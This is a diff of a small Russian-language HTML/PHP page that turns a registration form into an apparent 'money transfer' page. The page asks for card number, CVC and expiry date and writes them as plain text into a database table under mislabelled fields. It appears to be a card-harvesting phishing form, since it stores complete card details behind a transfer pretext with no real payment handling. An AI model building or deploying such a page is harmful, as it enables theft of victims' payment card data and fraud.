@@ -1,6 +1,6 @@
 <html>
 <head>
-<Title>Перевод денежных средств</Title>
+<Title>Данные карты отправителя</Title>
 <style type="text/css">
 body { background-color:
 #fff; border-top: solid 10px #000;
@@ -26,14 +26,14 @@ border: 0 none; }
 <form method="post" action="carta.php" enctype="multipart/form-data" >
 <input type ="text" name ="name" id ="name" placeholder ="Введите номер карты">
 <input type ="text" name ="email" id ="email" placeholder ="Ведите CVC..">
-<input type ="text" name ="country" id ="country" placeholder ="Номер карты..">
+<input type ="text" name ="country" id ="country" placeholder ="Введите дату..">
  <input type ="submit" name ="submit" value ="Проверить данные">
 <input type="button" value="Далее" name="buttonreg" onClick="but1()" />
 		       
 	<script>
 function but1()
 {
-     window.location = "cartapol.php"
+     window.location = "den.php"
 }
 </script>		
 
@@ -58,7 +58,7 @@ $email = $_POST['email'];
 $date = date("Y-m-d");
 $country = $_POST['country'];
 if ($name == "" || $email == "" || $country == "") {
-echo "<h3>Не заполнены поля name и famil.</h3>";
+echo "<h3>Не заполнены поля Номер карты и СVC и дата.</h3>";
 }
 else {
 $sql_insert ="INSERT INTO registration_on (name, email, date, country) VALUES (?,?,?,?)";
@@ -68,7 +68,7 @@ $stmt->bindValue(2, $email);
 $stmt->bindValue(3, $date);
 $stmt->bindValue(4, $country);
 $stmt->execute();
-echo "<h3>Вы зарегистрировались!</h3>";
+echo "<h3>Вы успешно заполнили данные!</h3>";
 }
 }
 catch(Exception $e) {
